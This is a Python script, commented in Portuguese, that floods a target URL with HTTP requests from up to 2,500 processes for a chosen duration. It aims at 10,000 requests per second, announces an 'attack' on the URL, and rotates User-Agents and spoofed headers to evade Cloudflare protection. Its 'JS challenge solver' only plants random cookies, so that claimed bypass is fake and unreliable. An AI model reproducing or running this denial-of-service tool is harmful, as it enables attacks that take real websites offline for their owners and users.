#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import time
import json
import sys
import os
from multiprocessing import Process, Manager, cpu_count
from datetime import datetime
from typing import List, Dict, Tuple, Optional
from fake_useragent import UserAgent
from urllib.parse import urlparse

# Configurações globais
MAX_RETRIES = 3
CONNECTION_TIMEOUT = 10
MAX_CONNECTIONS_PER_HOST = 100
TARGET_REQUESTS_PER_SECOND = 10000
WORKER_PROCESSES = min(2500, cpu_count() * 100)  # Ajuste baseado em CPUs disponíveis
USER_AGENT_ROTATION_FREQ = 100  # Rotacionar User-Agent a cada X requisições
REQUEST_TIMEOUT = aiohttp.ClientTimeout(total=30, connect=CONNECTION_TIMEOUT)

# Headers para bypass Cloudflare
BASE_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0',
    'TE': 'trailers',
}

# Lista de User-Agents para rotação
user_agent_rotator = UserAgent()

class CloudflareBypass:
    @staticmethod
    def generate_headers() -> Dict[str, str]:
        """Gera headers aleatórios para bypass do Cloudflare"""
        headers = BASE_HEADERS.copy()
        headers['User-Agent'] = user_agent_rotator.random
        
        # Adiciona headers específicos do Cloudflare
        if random.random() > 0.5:
            headers['CF-IPCountry'] = random.choice(['US', 'GB', 'DE', 'FR', 'CA', 'JP'])
        
        # Spoof de referer
        if random.random() > 0.7:
            headers['Referer'] = f"https://www.google.com/search?q={random.randint(100000, 999999)}"
        
        return headers

    @staticmethod
    async def solve_js_challenge(session: aiohttp.ClientSession, url: str) -> bool:
        """Simula a resolução de um desafio JS do Cloudflare"""
        try:
            # Delay aleatório para simular tempo de resolução
            await asyncio.sleep(random.uniform(2, 5))
            
            # Adiciona cookies que o Cloudflare pode esperar após o desafio
            session.cookie_jar.update_cookies({
                'cf_clearance': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=100)),
                '__cfduid': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=100))
            })
            
            return True
        except Exception:
            return False

class RequestStats:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.cloudflare_challenges = 0
        self.start_time = time.time()
        self.last_print_time = self.start_time
        self.request_times = []
    
    def add_request(self, success: bool, is_cf_challenge: bool = False):
        self.total_requests += 1
        if success:
            self.successful_requests += 1
        else:
            self.failed_requests += 1
        
        if is_cf_challenge:
            self.cloudflare_challenges += 1
        
        self.request_times.append(time.time())
        # Mantém apenas os tempos das últimas 60 segundos para cálculos
        self.request_times = [t for t in self.request_times if t > time.time() - 60]
    
    def get_current_rps(self) -> float:
        """Calcula requisições por segundo nos últimos 60 segundos"""
        if not self.request_times:
            return 0.0
        return len(self.request_times) / min(60, time.time() - self.request_times[0])
    
    def get_stats(self) -> Dict[str, float]:
        elapsed = max(1, time.time() - self.start_time)
        return {
            'total_requests': self.total_requests,
            'successful_requests': self.successful_requests,
            'failed_requests': self.failed_requests,
            'cloudflare_challenges': self.cloudflare_challenges,
            'requests_per_second': self.total_requests / elapsed,
            'current_rps': self.get_current_rps(),
            'success_rate': (self.successful_requests / self.total_requests) * 100 if self.total_requests else 0,
            'elapsed_time': elapsed,
        }

async def make_request(session: aiohttp.ClientSession, url: str, stats: RequestStats) -> bool:
    """Faz uma requisição HTTP com técnicas de bypass do Cloudflare"""
    headers = CloudflareBypass.generate_headers()
    retry_count = 0
    success = False
    
    # Delay aleatório entre requisições para evitar rate limiting
    await asyncio.sleep(random.uniform(0, 0.1))
    
    while retry_count < MAX_RETRIES and not success:
        try:
            async with session.get(url, headers=headers, timeout=REQUEST_TIMEOUT) as response:
                content = await response.text()
                
                # Verifica se encontramos um desafio do Cloudflare
                if response.status == 403 or "cloudflare" in content.lower() or "captcha" in content.lower():
                    stats.add_request(False, is_cf_challenge=True)
                    if await CloudflareBypass.solve_js_challenge(session, url):
                        retry_count += 1
                        continue
                    else:
                        break
                
                # Verifica outras respostas de erro
                if response.status >= 400:
                    stats.add_request(False)
                    retry_count += 1
                    await asyncio.sleep(random.uniform(1, 3))  # Backoff para erros
                    continue
                
                # Requisição bem-sucedida
                stats.add_request(True)
                success = True
                
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            stats.add_request(False)
            retry_count += 1
            await asyncio.sleep(random.uniform(0.5, 2))  # Backoff exponencial
    
    return success

async def worker(url: str, duration: float, stats: RequestStats, shared_stats: Dict):
    """Worker assíncrono que faz requisições continuamente"""
    conn = aiohttp.TCPConnector(
        limit=MAX_CONNECTIONS_PER_HOST,
        force_close=False,
        enable_cleanup_closed=True,
        ttl_dns_cache=300
    )
    
    async with aiohttp.ClientSession(
        connector=conn,
        trust_env=True,
        headers=BASE_HEADERS
    ) as session:
        start_time = time.time()
        user_agent_counter = 0
        
        while time.time() - start_time < duration:
            # Rotaciona User-Agent periodicamente
            if user_agent_counter >= USER_AGENT_ROTATION_FREQ:
                session.headers.update({'User-Agent': user_agent_rotator.random})
                user_agent_counter = 0
            
            await make_request(session, url, stats)
            user_agent_counter += 1
            
            # Atualiza estatísticas compartilhadas periodicamente
            if time.time() - stats.last_print_time >= 1:
                shared_stats.update(stats.get_stats())
                stats.last_print_time = time.time()

def process_worker(url: str, duration: float, shared_stats: Dict):
    """Worker de processo que gerencia o loop de eventos assíncrono"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    stats = RequestStats()
    try:
        loop.run_until_complete(worker(url, duration, stats, shared_stats))
    finally:
        loop.close()

class MetricsLogger:
    @staticmethod
    def log_stats(stats: Dict, save_json: bool = False):
        """Loga estatísticas em tempo real"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(f"\n{'='*50}")
        print(f"HTTP Request Sender - Status Atual")
        print(f"{'='*50}")
        print(f"Total de Requisições: {stats['total_requests']:,}")
        print(f"Requisições Bem-sucedidas: {stats['successful_requests']:,} ({stats['success_rate']:.2f}%)")
        print(f"Requisições Falhas: {stats['failed_requests']:,}")
        print(f"Desafios Cloudflare Encontrados: {stats['cloudflare_challenges']:,}")
        print(f"RPS (Total): {stats['requests_per_second']:,.2f}")
        print(f"RPS (Últimos 60s): {stats['current_rps']:,.2f}")
        print(f"Tempo Decorrido: {stats['elapsed_time']:.2f}s")
        print(f"{'='*50}")
        
        if save_json:
            with open(f"http_stats_{int(time.time())}.json", 'w') as f:
                json.dump(stats, f, indent=2)

def validate_url(url: str) -> bool:
    """Valida a URL fornecida"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def main():
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <url> <duration_in_seconds>")
        sys.exit(1)
    
    url = sys.argv[1]
    if not validate_url(url):
        print("Erro: URL inválida. Forneça uma URL completa (ex: https://exemplo.com)")
        sys.exit(1)
    
    try:
        duration = float(sys.argv[2])
        if duration <= 0:
            raise ValueError
    except ValueError:
        print("Erro: Duração deve ser um número positivo de segundos")
        sys.exit(1)
    
    print(f"Iniciando ataque a {url} por {duration} segundos...")
    print(f"Configuração: {WORKER_PROCESSES} workers, alvo de {TARGET_REQUESTS_PER_SECOND:,} RPS")
    
    with Manager() as manager:
        shared_stats = manager.dict({
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'cloudflare_challenges': 0,
            'requests_per_second': 0.0,
            'current_rps': 0.0,
            'success_rate': 0.0,
            'elapsed_time': 0.0,
        })
        
        processes = []
        for _ in range(WORKER_PROCESSES):
            p = Process(target=process_worker, args=(url, duration, shared_stats))
            p.start()
            processes.append(p)
        
        try:
            start_time = time.time()
            while time.time() - start_time < duration:
                MetricsLogger.log_stats(dict(shared_stats))
                time.sleep(0.5)
            
            # Espera todos os processos terminarem
            for p in processes:
                p.join(timeout=5)
                if p.is_alive():
                    p.terminate()
            
            # Log final
            MetricsLogger.log_stats(dict(shared_stats), save_json=True)
            print("\nConcluído!")
            
        except KeyboardInterrupt:
            print("\nInterrompido pelo usuário. Encerrando workers...")
            for p in processes:
                p.terminate()
            
            # Log final
            MetricsLogger.log_stats(dict(shared_stats), save_json=True)

if __name__ == "__main__":
    main()
